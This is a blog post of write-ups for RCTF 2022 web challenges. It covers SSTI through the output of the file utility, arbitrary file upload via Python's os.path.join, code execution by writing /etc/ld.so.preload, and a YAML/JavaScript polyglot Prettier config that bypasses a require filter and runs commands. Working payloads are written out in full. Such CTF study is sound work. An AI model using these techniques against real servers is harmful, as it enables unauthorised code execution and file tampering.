---
title: RCTF 2022 Notes
catalog: true
date: 2022-12-14 20:10:44
tags: [Security]
categories: [Security]
photos: /img/rctf-2022-writeup/cover-en.png
---

Here are some notes on the challenges I solved during RCTF 2022. I won't be including those I didn't attempt.

As usual, here are the keywords:

1. Exploiting Python's os.path.join
2. YAML & JS polyglot
3. strace & LD_PRELOAD

<!-- more -->

## filechecker series

### mini

Code:

``` py
from flask import Flask, request, render_template, render_template_string
from waitress import serve
import os
import subprocess

app_dir = os.path.split(os.path.realpath(__file__))[0]
app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = f'{app_dir}/upload/'

@app.route('/', methods=['GET','POST'])
def index():
    try:
        if request.method == 'GET':
            return render_template('index.html',result="ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿")

        elif request.method == 'POST':
            f = request.files['file-upload']
            filepath = os.path.join(app.config['UPLOAD_FOLDER'], f.filename)

            if os.path.exists(filepath) and ".." in filepath:
                return render_template('index.html', result="Don't (^=◕ᴥ◕=^) (^=◕ᴥ◕=^) (^=◕ᴥ◕=^)")
            else:
                f.save(filepath)
                file_check_res = subprocess.check_output(
                    ["/bin/file", "-b", filepath], 
                    shell=False, 
                    encoding='utf-8',
                    timeout=1
                )
                os.remove(filepath)
                if "empty" in file_check_res or "cannot open" in file_check_res:
                    file_check_res="wafxixi ฅ•ω•ฅ ฅ•ω•ฅ ฅ•ω•ฅ"
                return render_template_string(file_check_res)

    except:
        return render_template('index.html', result='Error ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ')

if __name__ == '__main__':
    serve(app, host="0.0.0.0", port=3000, threads=1000, cleanup_interval=30)
```

In short, you upload a file, and the server stores it. It then checks the file using `/bin/file` and passes the output to `render_template_string`. This means that if we can control the output, we can easily perform SSTI.

At the time, I went to the file's Github to look for tests that I could use. Finally, I found this: https://github.com/file/file/blob/master/tests/escapevel.result

As you can see, the output includes a MIME type. This MIME type exists in the original file, so we just need to modify it.

After seeing other writeups, I realized that this is the simplest solution:

```
#!/testabc haha{{7+7}}
```

The output will be:

```
a /testabc haha{{7+7}} script text executable, ASCII text, with no line terminators
```

### plus

Next is the enhanced version. The code is similar to the previous one, but the only difference is that the result is not passed to `render_template_string`, so SSTI is not possible.

At first, I thought that this challenge would be related to how file works. I thought it might be related to how it determines the type (magic/libmagic), and then I would find a way to upload the flag file as input and write my own judgment to slowly leak the file content.

However, my teammate found a vulnerability in this part:

``` py
filepath = os.path.join(app.config['UPLOAD_FOLDER'], f.filename)
if os.path.exists(filepath) and ".." in filepath:
```

Python's behavior is quite interesting. If the second parameter of `os.path.join` starts with `/`, it does not perform a join:

``` py
os.path.join("/tmp/a/", "b") # /tmp/a/b
os.path.join("/tmp/a/", "/b") # /b
```

Therefore, we can upload files to any location without `..`. We just need to write a C program to overwrite `/bin/file`.

### promax

This challenge fixed half of the vulnerability in the previous challenge. It only prevents uploading if the file already exists, so we cannot overwrite it. We can only upload new files.

At this point, we still tried to find a solution based on the previous challenge. We looked for ways to use the existing mechanism. However, another teammate said he had a possible unexpected solution, and we solved it.

The idea is to upload a file to `/etc/ld.so.preload` with the contents of `/tmp/a.so`, and then upload another file to `/tmp/a.so`. At this point, the binary will load the code in the file before execution.

Here are the detailed answers from lavish in DC:

1. `os.path.join(app.config['UPLOAD_FOLDER'], f.filename)` allows for arbitrary file upload when f.filename is an absolute path.
2. Unlike filechecker_plus, you can't now overwrite existing files such as `/bin/file`, so you have to identify a way to obtain RCE by uploading a file that does not previously exist on the filesystem
3. If you strace an execution of `/bin/file`, you will notice that it tries to open (like any other executable) the `/etc/ld.so.preload` file. Have a look with `strace file -b <whatever> |& grep ENOENT` -> `access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)`
4. `/etc/ld.so.preload` is used to specify a list of shared libraries that are preloaded when any executable is run
5. At this point, you need to craft an .so that prints the flag, upload it to a random location on the fs, upload a `/etc/ld.so.preload` containing the path to your .so and execute file again so that the flag is returned
6. Since files are deleted after being uploaded, you need to exploit a race condition. You should also ensure that file does a clean exit, otherwise subprocess.check_output will raise an exception.

I haven't actually used strace before, but I found it quite useful. Here's a simple record of how to use it:

1. `strace file -b <whatever> |& grep ENOENT`
2. `strace file /etc/passwd 2>&1 | grep "No such file or directory"`

You can see which system calls were called and which files were accessed.

Because this solution seems to have little to do with file, we always thought it was unexpected, but in the end we found out that it was actually the expected solution.

Author's writeup: https://github.com/L1aovo/my-ctf-challenges/tree/main/RCTF2022

## PrettierOnline

First of all, I really like this question.

The main code is here:

``` js
const fs = require('fs')
const crypto = require('crypto')
const prettier = require('prettier')
const { nextTick, exit } = require('process')
require('./fw')

const id = fs.readFileSync('./dist/id', 'utf-8').toString('utf-8').trim()
fs.unlinkSync('./dist/id')
prettier.resolveConfig(`${__dirname}/.prettierrc`).then(config => {
  const ret = prettier.format(fs.readFileSync(__filename, 'utf-8'), config)
  const o = crypto.createHash('sha256').update(Buffer.from(id, 'utf-8')).digest().toString('hex')
  fs.writeFileSync(`./dist/${id}`, o, 'utf-8')
  fs.writeFileSync('./dist/ret.js', ret, 'utf-8')
  nextTick(() => {
    throw new Error('No NextTick here!')
  })
  exit(0)
})
```

Simply put, it loads the configuration file and then runs prettier. The only thing you can control in this question is the configuration file.

Then in `./fw.js`, it patches `require`:

``` js
const Module = require('module')
const oldRequire = Module.prototype.require
Module.prototype.require = function (id) {
  if (typeof id !== 'string') {
    throw new Error('Bye')
  }
  const isCore = Module.isBuiltin(id)
  if (isCore) {
    if (!/fs|path|util|os/.test(id)) {
      throw new Error('Bye, ' + id)
    }
  } else {
    id = Module._resolveFilename(id, this)
  }
  return oldRequire.call(oldRequire, id)
}
process.dlopen = () => {}
```

Since it's about prettier config, the first step is to look at the official documentation: https://prettier.io/docs/en/configuration.html

At the time, I saw a few points:

1. Supports YAML
2. There is a Sharing configurations thing, which only puts a string and changes it to require that string

For example, if your `.prettierrc` looks like this:

```
hello
```

When you run prettier, you will get: `Error: Cannot find module 'hello'`

But because there are no other files that can be controlled on the server, we didn't realize what we could do, so we continued to study what prettier actually did, and spent some time tracing it with a debugger. We found that even if you throw JSON, it still goes to `yaml.parse` to parse your code (which is a useless discovery).

Later, after looking around, I realized that there were plugins, so I wrote this configuration file:

```
{
  "plugins": ["abc"]
}
```

The error message `Error: Cannot find module 'abc'` appears, indicating that prettier will require the plugin.

So what do we need to require? At this point, I thought of the only file we could control: `.prettierrc`, which means that if `.prettierrc` is both a configuration file and a JS file, it will work.

Fortunately, this is easy in YAML:

``` yaml
plugins:
  - ".prettierrc"
abc:
  - console.log(1)
```

`plgusin:` is a tag in JS, `-` is a minus sign, so there is no problem at all. At this point, I thought this question was quite interesting, combining the concept of JS+yaml polyglot with real world prettier as an example.

After you can execute the code, you need to see how to bypass the require restriction. I tried `import()` but it didn't work. Later, I thought that since any JS can be executed arbitrarily, I just need to change it randomly, like this:

``` yaml
plugins:
  - ".prettierrc"
abc:
  - eval("h=RegExp.prototype.test;RegExp.prototype.test=function(v){return v == 'child_process' ? true : h.call(this,v)};f=require('child_process').execSync('/readflag').toString();fs=require('fs');w=fs.writeFileSync;fs.writeFileSync=function(a,b,c){ if(a=='./dist/ret.js'){b=f}; return w.call(fs,a,b,c) }")
```

Readable version:

``` js
h = RegExp.prototype.test;
RegExp.prototype.test = function(v){
 return v == 'child_process' ? true : h.call(this,v)
};

f = require('child_process').execSync('/readflag').toString();

fs = require('fs');
w = fs.writeFileSync;
fs.writeFileSync=function(a,b,c){
  if(a == './dist/ret.js'){
    b = f
  };
  return w.call(fs,a,b,c)
}
```

First, change `RegExp.test` so that you can require anything, and then change the content to flag when `fs.writeFileSync` is called, and finally you can get the flag.

Author's writeup: https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf2022/prettieronline

It turns out that you don't need to bypass require at all, you can just use `module.constructor._load('child_process')`, because require also calls this _load method inside: https://github.com/nodejs/node/blob/265ea1e74ef429f7c27f05ac4cc9136adf2e8d9b/lib/internal/modules/cjs/loader.js

``` js
// Loads a module at the given file path. Returns that module's
// `exports` property.
Module.prototype.require = function(id) {
  validateString(id, 'id');
  if (id === '') {
    throw new ERR_INVALID_ARG_VALUE('id', id,
                                    'must be a non-empty string');
  }
  requireDepth++;
  try {
    return Module._load(id, this, /* isMain */ false);
  } finally {
    requireDepth--;
  }
};
```

Finally, there is also a cool Nu1L payload:

```
/*/../app/.prettierrc
#*/const fs = require('fs'); var a = fs.readFileSync("flag", "utf-8");fs.writeFileSync("./dist/ret.js",a);fs.chmodSync("./dist/ret.js",0o444);process.addListener('uncaughtException', (err) => {console.log("ss",err);process.exit(0);})
```

This utilizes the `require` function that outputs a string as mentioned earlier. Behind the scenes, it first uses YAML parse, so anything after the `#` symbol is a comment. The path part uses `/*` combined with the second line's `*/` to become valid JS. Tql!

Finally, here are other writeups that were found:

1. [RCTF 2022 WriteUp By F61d](https://www.ctfiot.com/85535.html)
2. [2022RCTF WriteUp by Venom](https://cn-sec.com/archives/1460829.html)
